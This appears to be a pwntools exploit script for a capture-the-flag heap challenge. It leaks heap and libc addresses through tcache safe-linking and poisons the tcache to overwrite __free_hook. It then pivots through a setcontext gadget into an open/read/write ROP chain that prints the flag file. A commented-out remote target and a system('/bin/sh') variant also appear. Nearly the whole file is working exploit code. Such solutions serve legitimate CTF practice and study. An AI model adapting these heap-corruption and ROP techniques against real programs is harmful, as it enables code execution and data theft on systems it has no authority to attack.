#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(":")
# p = remote(remote_service[0], int(remote_service[1]))
# p = remote("192.168.166.190", 58013)
filename = "./pwn"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	lg("p.pid")
	input()
	pass

def cmd(choice):
	ru(b'Choice: ')
	sl(i2b(choice))

def add():
	cmd(1)

def delete(idx):
	cmd(2)
	ru(b'Idx: \n')
	sl(i2b(idx))

def show(idx):
	cmd(3)
	ru(b'Idx: \n')
	sl(i2b(idx))

def edit(idx, content, size=0):
	if (size==0):
		size = len(content)
	cmd(4)
	ru(b'Idx: \n')
	sl(i2b(idx))
	ru(b'Size: \n')
	sl(i2b(size))
	ru(b'Content: \n')
	sn(content)

def magic_frame(rdx_rdi, secontext_addr, rdi, rsi, rdx, rsp, rip):
	payload = p64(0) + p64(rdx_rdi) + p64(0) * 2  			#rdx
	payload += p64(secontext_addr)			 				#setcontext+61
	payload = payload.ljust(0x68, b'\x00')
	payload += p64(rdi) + p64(rsi)  						# rdi , rsi
	payload += p64(0) * 2 + p64(rdx) + p64(0x18) + p64(0)  	# rdx
	payload += p64(rsp) + p64(rip)  						# rsp, rip(func_addr)
	payload = payload.ljust(0xf8, b'\x00')
	return payload

for i in range(9):		# 8
	add()

for i in range(8):
	delete(i)			# 7

# add()
# delete(0)

show(0)
heap_xor = uu64(ru(b"\nDone", "drop"))
heap_base = heap_xor << 12
lg("heap_base")

edit(7, p8(1))
show(7)
libc_base = uu64(ru(b"\nDone", "drop")) - 0x1e0c01
lg("libc_base")

edit(7, p8(0))

debugPID()

free_hook_addr = libc_base + 0x1e3e20
system_addr = libc_base + 0x4fa60

target = (heap_base + 0x100)^heap_xor
edit(6, p64(target))
add()
add()

magic_gadget = 0x14a0a0 + libc_base
set_context = 0x52970 + libc_base
frame = SigreturnFrame()
rop_addr = heap_base + 0x3b0
flag_addr = heap_base + 0x4c0
pop_rax_ret = libc_base + 0x44c70
pop_rdi_ret = libc_base + 0x28a55
pop_rsi_ret = libc_base + 0x2a4cf
pop_rdx_ret = libc_base + 0xc7f32
p_rdx_r12_r = libc_base + 0x112a51
read_f = libc_base + l.symbols["read"]
write_f = libc_base + l.symbols["write"]
syscall = libc_base + 0x26858
ret = libc_base + 0x26699
flag_str_addr = heap_base + rop_addr + 0xf0


orw = flat([
		pop_rdi_ret, flag_str_addr,
		pop_rsi_ret, 0,
		pop_rax_ret, 2,
		syscall,
		pop_rdi_ret, 3,
		pop_rsi_ret, flag_addr,
		p_rdx_r12_r, 0x30, 0,
		pop_rax_ret, 0,
		syscall,
		pop_rdi_ret, 1,
		pop_rsi_ret, flag_addr,
		p_rdx_r12_r, 0x30, 0,
		pop_rax_ret, 1,
		syscall
	])

rop = p64(pop_rdi_ret)+p64(flag_addr)
rop += p64(pop_rsi_ret)+p64(0)
rop += p64(pop_rax_ret)+p64(2)
rop += p64(syscall)
rop += p64(pop_rdi_ret)+p64(3)
rop += p64(pop_rsi_ret)+p64(flag_addr)
rop += p64(pop_rdx_ret)+p64(0x30)
rop += p64(read_f)
rop += p64(pop_rdi_ret)+p64(1)
rop += p64(pop_rsi_ret)+p64(flag_addr)
rop += p64(pop_rdx_ret)+p64(0x30)
rop += p64(write_f)

payload = p64(0) + p64(heap_base+0x3b0)+p64(0)*2
payload += p64(set_context+61)
payload = payload.ljust( 0x68, b'\x00')
payload += p64(heap_base) + p64(0x2100)
payload += p64(0)*2 + p64(7) +p64(0x18) + p64(0)
payload += p64(heap_base+0x3b0) + p64(ret)
payload = payload.ljust(0xf8,b'\x00' )

edit(2, payload)
payload = orw.ljust(0xf0, b'\x00') + b'./flag\x00\x00'
edit(1, payload)

target = free_hook_addr
edit(10, p64(0) + p64(target))
# edit(10, p64(0)*3 + p64(libc_base + l.symbols['system']))
debugPID()
add()

edit(11, p64(rop_addr))

delete(0)
# edit(2, b"/bin/sh\x00")

irt()